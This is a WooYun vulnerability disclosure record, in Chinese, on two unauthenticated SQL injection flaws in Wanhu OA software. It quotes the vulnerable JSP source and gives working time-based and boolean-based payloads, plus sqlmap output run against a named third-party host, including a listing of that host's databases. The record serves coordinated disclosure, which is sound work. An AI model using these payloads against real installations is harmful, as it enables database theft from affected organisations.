{"id": 1380, "wybug_id": "wooyun-2014-065275", "wybug_title": "万户OA两处盲注DBA权限（无需登陆）", "wybug_corp": "万户OA", "wybug_author": "路人甲", "wybug_date": "2014-06-17 16:59", "wybug_open_date": "2014-09-15 17:00", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射漏洞利用技巧", "白盒测试", "源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-24：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-15：\t细节向公众公开  简要描述： 万户OA两处盲注DBA权限（无需登陆）一处是布尔型盲注，适用万户OA标准版一处是延时盲注，通杀标准版和专业版 详细说明：  先说通杀标准版和专业版的延时盲注。注入点：/defaultroot/outMailLoginCheck.jsp\n<%@ page contentType=\"text/html; charset=GBK\"%><%//盾安外部邮件登陆检查com.whir.common.util.DataSourceBase dsb = new com.whir.common.util.DataSourceBase();try{    java.sql.Connection conn = dsb.getDataSource().getConnection();    java.sql.Statement stmt = conn.createStatement();    java.sql.ResultSet rs = stmt.executeQuery(\"SELECT * FROM EZOFFICE.OA_MAILLOGIN WHERE USERACCOUNT='\" + request.getParameter(\"userAccount\") + \"' AND RANDOM='\" + request.getParameter(\"outMailRandom\") + \"'\");    if(rs.next()){        out.print(true);    }else{        out.print(false);    }    conn.close();}catch(Exception e){}%>\n一看就知道盲注，在OA_MAILLOGIN表默认为空的情况就只有比较慢的延时盲注了，直接指定sqlmap的technique=T。先试试标准版的http://oa.frjt.net:8081/defaultroot/outMailLoginCheck.jsp?userAccount=&outMailRandom=\nsqlmap identified the following injection points with a total of 125 HTTP(s) requests:---Place: GETParameter: userAccount    Type: AND/OR time-based blind    Title: MySQL < 5.0.12 AND time-based blind (heavy query)    Payload: userAccount=' AND 4843=BENCHMARK(5000000,MD5(0x4758714c)) AND 'YsEW'='YsEW&outMailRandom=---web application technology: JSPback-end DBMS: MySQL >= 5.0.0\n再试试专业版的\n\n   漏洞证明：  再就是布尔型盲注了，这个只有标准版有。/defaultroot/synccustomize_simple.jsp\n<%   String flag=request.getParameter(\"flag\");   String menuname = request.getParameter(\"menuname\");   if(\"sync\".equals(flag)){      //数据\t  String s_String = \"\";\t  int s_int = 0;      String[][]  res = null;\t  DbOpt dbopt = null;      try {\t\t\t\t  dbopt = new DbOpt();\t\t\t\t  String Sql = \"\";\t\t\t\t  Sql = \"select MENU_id,MENULEVEL,MENUVIEW,MENUVIEWUSER,MENUVIEWORG,MENUVIEWGROUP,MENUPARENT,MENUURL,MENUORDER,DESKTOP1,DESKTOP2,menuIdString,isSystemInit,INUSE,LEFTURL,RIGHTURL,MENUCODE,menuname  from OA_MENUSET where menuname='\"+menuname+\"' \";\t\t\t\t  res = dbopt.executeQueryToStrArr2(Sql,18);\t\t\t\t  if(res != null){                     String _cnt = dbopt.executeQueryToStr(\"Select count(*) from oa_custmenu where menu_name='\"+menuname+\"' \");\t\t\t\t\t s_int = Integer.parseInt(_cnt);.......\t\t\t\t\t }else if(s_int>1){\t\t\t\t\t   s_String = \"查出\"+s_int+\"条数据，未处理！\";\t\t\t\t\t }\t\t\t\t  }\t\t\t\t  \t\t\t\t  dbopt.close();\t\t\t} catch (Exception e) {\t\t\t    e.printStackTrace();\t\t\t} finally {\t\t\t    try {\t\t\t        dbopt.close();\t\t\t    } catch (SQLException ex) {\t\t\t    }\t\t\t}  %></table><table width=\"100%\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\" class=\"pagebar\"> <tr>    <td><%=s_String%>&nbsp;</td>\n这里就可以用布尔型盲注，多开点线程速度就妥妥的了。验证：http://oa.frjt.net:8081/defaultroot/synccustomize_simple.jsp?flag=sync&menuname=%E8%AE%BA%E5%9D%9B\nweb application technology: JSPback-end DBMS: MySQL >= 5.0.0sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: POSTParameter: menuname    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: flag=sync&menuname=%E8%AE%BA%E5%9D%9B' AND 8760=8760 AND 'pBAh'='pBAh---web application technology: JSPback-end DBMS: MySQL >= 5.0.0available databases [3]:[*] ezoffice[*] information_schema[*] mysql\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2014-06-21 22:39 厂商回复： CNVD确认并复现所述演示案例情况，已经由CNVD联系软件生产厂商，电话至****，将通报发送至zhuobq 、lixin_reg 、jiangrong415 邮箱中处置。  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-22 10:53 |    \t\t瘦蛟舞  \t\t\t( 普通白帽子  |\t\t\t        Rank:687 漏洞数:78        | 铁甲依然在)\t\t \n  @Finger 求审核http://www.wooyun.org/bugs/wooyun-2014-065752/trace/774e735b50149ca9c5e7a22ab08edd16    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 16, "Ranks": null}